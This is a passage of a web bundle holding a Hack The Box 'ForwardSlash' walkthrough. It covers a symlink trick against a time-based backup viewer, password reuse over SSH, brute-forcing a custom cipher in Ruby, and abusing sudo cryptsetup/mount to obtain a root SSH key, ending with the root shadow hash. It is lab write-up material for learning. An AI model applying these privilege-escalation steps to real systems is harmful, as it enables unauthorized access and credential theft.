pain."),(0,a.kt)("p",null,"Let's try to run it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"chiv@forwardslash:~$ backup\n----------------------------------------------------------------------\n        Pain's Next-Gen Time Based Backup Viewer\n        v0.1\n        NOTE: not reading the right file yet,\n        only works if backup is taken in same second\n----------------------------------------------------------------------\n\nCurrent Time: 18:37:43\nERROR: 01430555472f086a6633fad6bfc18d98 Does Not Exist or Is Not Accessible By Me, Exiting...\n")),(0,a.kt)("p",null,"There is a hash in the error output, let's identify the hash type with :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ haiti 01430555472f086a6633fad6bfc18d98\nMD2 [JtR: md2]\nMD5 [HC: 0] [JtR: raw-md5]\nMD4 [HC: 900] [JtR: raw-md4]\nDouble MD5 [HC: 2600]\nLM [HC: 3000] [JtR: lm]\nRIPEMD-128 [JtR: ripemd-128]\nHaval-128 [JtR: haval-128-4]\nTiger-128\nSkein-256(128)\nSkein-512(128)\nLotus Notes/Domino 5 [HC: 8600] [JtR: lotus5]\nSkype [HC: 23]\nSnefru-128 [JtR: snefru-128]\nNTLM [HC: 1000] [JtR: nt]\nDomain Cached Credentials [HC: 1100] [JtR: mscach]\nDomain Cached Credentials 2 [HC: 2100] [JtR: mscach2]\nDNSSEC(NSEC3) [HC: 8300]\nRAdmin v2.x [HC: 9900] [JtR: radmin]\n")),(0,a.kt)("p",null,"It's most likely a MD5 hash but we can't crack it."),(0,a.kt)("p",null,"As it's a ",(0,a.kt)("em",{parentName:"p"},"Time Based Backup Viewer")," it's maybe the hash of the timestamp."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ printf %s '18:37:43' | md5sum\n01430555472f086a6633fad6bfc18d98  -\n")),(0,a.kt)("p",null,"Let's write a script that will create a file like this."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"time=$(date +\"%H:%M:%S\")\nhash=$(printf %s $time | md5sum | cut -d ' ' -f 1)\n# create file\necho 'cyfun test' > $hash\n# call backup\nbackup\n")),(0,a.kt)("p",null,"If we execute the script we have no error now and the file is read:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"chiv@forwardslash:/tmp/cyfun$ ./time.sh\n----------------------------------------------------------------------\n        Pain's Next-Gen Time Based Backup Viewer\n        v0.1\n        NOTE: not reading the right file yet,\n        only works if backup is taken in same second\n----------------------------------------------------------------------\n\nCurrent Time: 18:51:46\ncyfun test\n")),(0,a.kt)("p",null,"So we can read a file owned by pain now by modifying our scipt:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"time=$(date +\"%H:%M:%S\")\nhash=$(printf %s $time | md5sum | cut -d ' ' -f 1)\n# create file\nln -s /var/backups/config.php.bak $hash\n# call backup\nbackup\n")),(0,a.kt)("p",null,"Now we can read ",(0,a.kt)("inlineCode",{parentName:"p"},"/var/backups/config.php.bak"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n/* Database credentials. Assuming you are running MySQL\nserver with default setting (user 'root' with no password) */\ndefine('DB_SERVER', 'localhost');\ndefine('DB_USERNAME', 'pain');\ndefine('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');\ndefine('DB_NAME', 'site');\n\n/* Attempt to connect to MySQL database */\n$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);\n\n// Check connection\nif($link === false){\n    die(\"ERROR: Could not connect. \" . mysqli_connect_error());\n}\n?>\n")),(0,a.kt)("p",null,"Again let's try credential stuffing on SSH:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ssh pain@forwardslash.htb\npain@forwardslash.htb's password:\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Jul  5 19:12:12 UTC 2020\n\n  System load:  0.0                Processes:            174\n  Usage of /:   30.8% of 19.56GB   Users logged in:      1\n  Memory usage: 11%                IP address for ens33: 10.10.10.183\n  Swap usage:   0%\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n16 packages can be updated.\n0 updates are security updates.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Thu Mar  5 14:22:04 2020 from 192.168.56.1\npain@forwardslash:~$ cat user.txt\ndd552dcd5a367ea132ee2f017dc5a02d\n")),(0,a.kt)("h3",{id:"decrypting-the-ciphertext"},"Decrypting the ciphertext"),(0,a.kt)("p",null,"We can run some commands as root:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~/encryptorinator$ sudo -l\nMatching Defaults entries for pain on forwardslash:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser pain may run the following commands on forwardslash:\n    (root) NOPASSWD: /sbin/cryptsetup luksOpen *\n    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/\n    (root) NOPASSWD: /bin/umount ./mnt/\n")),(0,a.kt)("p",null,"Let's see what is in pain home directory:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~$ ls -lhA\ntotal 40K\nlrwxrwxrwx 1 pain root    9 Mar  6 09:43 .bash_history -> /dev/null\n-rw-r--r-- 1 pain pain  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 pain pain 3.7K Apr  4  2018 .bashrc\ndrwx------ 2 pain pain 4.0K Mar  5 14:22 .cache\ndrwxr-xr-x 2 pain root 4.0K Mar 24 12:06 encryptorinator\ndrwx------ 3 pain pain 4.0K Mar  5 14:22 .gnupg\ndrwxrwxr-x 3 pain pain 4.0K Mar  6 14:23 .local\n-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt\n-rw-r--r-- 1 pain pain  807 Apr  4  2018 .profile\ndrwx------ 2 pain pain 4.0K Mar 17 20:29 .ssh\n-rw------- 1 pain pain   33 Jul  5 18:34 user.txt\n")),(0,a.kt)("p",null,"There is a note file talking about a crypto software."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~$ cat note.txt\nPain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.\n\n-chiv\npain@forwardslash:~$ ls -lhA encryptorinator/\ntotal 8.0K\n-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext\n-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py\n")),(0,a.kt)("p",null,"Also it seems that pain is in the ",(0,a.kt)("inlineCode",{parentName:"p"},"backupoperator")," group."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~$ id\nuid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)\n")),(0,a.kt)("p",null,"So we can now see what is in ",(0,a.kt)("inlineCode",{parentName:"p"},"/var/backups/recovery/"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~$ ls -lhA /var/backups/recovery/encrypted_backup.img\n-rw-r----- 1 root backupoperator 954M Mar 24 12:12 /var/backups/recovery/encrypted_backup.img\n")),(0,a.kt)("p",null,"An encrypted backup! We must take a look to the crypto-soft to break that."),(0,a.kt)("p",null,"Let's look a this ugly python script ",(0,a.kt)("inlineCode",{parentName:"p"},"encrypter.py"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"def encrypt(key, msg):\n    key = list(key)\n    msg = list(msg)\n    for char_key in key:\n        for i in range(len(msg)):\n            if i == 0:\n                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])\n            else:\n                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])\n\n            while tmp > 255:\n                tmp -= 256\n            msg[i] = chr(tmp)\n    return ''.join(msg)\n\ndef decrypt(key, msg):\n    key = list(key)\n    msg = list(msg)\n    for char_key in reversed(key):\n        for i in reversed(range(len(msg))):\n            if i == 0:\n                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))\n            else:\n                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))\n            while tmp < 0:\n                tmp += 256\n            msg[i] = chr(tmp)\n    return ''.join(msg)\n\n\nprint encrypt('REDACTED', 'REDACTED')\nprint decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))\n")),(0,a.kt)("p",null,"It's a custom block cipher, so the only things that matter is to find the key\nlenght and the first character of the key which much more simple than guessing\nthe exact key. Maybe the beginning for the decrypted text will be messed up\nbut with luck we won't need it."),(0,a.kt)("p",null,"Let's download the ciphertext locally:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ scp pain@forwardslash.htb:/home/pain/encryptorinator/ciphertext ./\n")),(0,a.kt)("p",null,"As I am more at ease with Ruby than with Python, I rewrote the ",(0,a.kt)("inlineCode",{parentName:"p"},"decrypt()"),"\nmethod in Ruby and then made a script to bruteforce an approximative key."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},"#!/usr/bin/env ruby\n\ndef decrypt(key, msg)\n  key = key.chars\n  msg = msg.chars\n  tmp = 0\n  key.reverse.each do |char_key|\n    (0...msg.size).reverse_each do |i|\n      if i == 0\n        tmp = msg[i].ord - (char_key.ord + msg[-1].ord)\n      else\n        tmp = msg[i].ord - (char_key.ord + msg[i-1].ord)\n      end\n      while tmp < 0\n        tmp += 256\n      end\n      msg[i] = tmp.chr\n    end\n  end\n  return msg.join\nend\n\nciphertext = File.binread('ciphertext')\nwords = ['encrypt', 'key', 'backup', 'password']\nfound_key = false\n\n(1..100).each do |key_length|\n  ('a'..'z').each do |c|\n    guessed_key = c * key_length\n    d = decrypt(guessed_key, ciphertext)\n    if words.any? { |word| d.include?(word) }\n      puts \"Approximate key: #{guessed_key}\"\n      puts \"Partially decrypted text: #{d}\"\n      found_key = true\n      break\n    end\n    break if found_key\n  end\nend\n")),(0,a.kt)("p",null,"Now let's run it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ruby bf.rb\nApproximate key: ttttttttttttttttt\nPartially decrypted text: \ufffd$7C\ufffd\ufffdq8\ufffd\ufffd4\ufffdl'you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf\ufffd\n")),(0,a.kt)("p",null,"The crypto part is not interesting me so I won't develop the explanation more\nthan that but you can take a look at ",(0,a.kt)("a",{parentName:"p",href:"https://www.youtube.com/watch?v=alJa51XylDE"},"IppSec video"),"\nto see the reasoning."),(0,a.kt)("h3",{id:"privilege-escalation--from-pain-to-root"},"Privilege Escalation : from pain to root"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ pain@forwardslash:~/encryptorinator$ file /var/backups/recovery/encrypted_backup.img\n/var/backups/recovery/encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf\n")),(0,a.kt)("p",null,"Now it's pretty clear we have to mount the LUKS container with the password we\njust found."),(0,a.kt)("p",null,"Let's see the commands we can run as root again:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~/encryptorinator$ sudo -l\nMatching Defaults entries for pain on forwardslash:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser pain may run the following commands on forwardslash:\n    (root) NOPASSWD: /sbin/cryptsetup luksOpen *\n    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/\n    (root) NOPASSWD: /bin/umount ./mnt/\n")),(0,a.kt)("p",null,"First we open the LUKS container and create a mount point."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup\nEnter passphrase for /var/backups/recovery/encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf\n\npain@forwardslash:~/encryptorinator$ mkdir -p /tmp/cyfun2/mnt\n\npain@forwardslash:~/encryptorinator$ cd /tmp/cyfun2\n")),(0,a.kt)("p",null,"Then we can mount the openned container:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:/tmp/cyfun2$ sudo /bin/mount /dev/mapper/backup ./mnt/\n")),(0,a.kt)("p",null,"The mounted device contains only one file:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"pain@forwardslash:/tmp/cyfun2$ cat mnt/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK\nRKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf\nyLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc\nu2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu\nNWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9\nMqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa\nV+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg\nG8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO\n3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC\nvROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p\nMIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD\nIh0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn\n5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs\nV4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg\ne1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8\n6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh\ni2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq\ntT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW\nwoUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi\n/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA\n1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW\nJ5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr\nOENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw\nddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo\nZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o\n-----END RSA PRIVATE KEY-----\n")),(0,a.kt)("p",null,"This must be the root SSH key."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ chmod 600 id_rsa_root\n$ ssh root@forwardslash.htb -i id_rsa_root\n")),(0,a.kt)("p",null,"Let's grab the loot!"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"root@forwardslash:~# cat root.txt\n12c0583823e80694824b9dd3e6c2ae93\n\nroot@forwardslash:~# cat /etc/shadow | grep root\nroot:$6$daB3I84E$NnzV4cHTAgWsPGWoBKLO2W6NotitrAk6udeTh0cxvXWHIkDXZQtss13QP2gTgFOMdIYdQ8CtvSxzznHI.nVmW.:18326:0:99999:7:::\n")),(0,a.kt)("p",null,":"))}d.isMDXComponent=!0},72749:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/forwardslash-13f941697c9604ff147c7dafbf479865.png"}}]);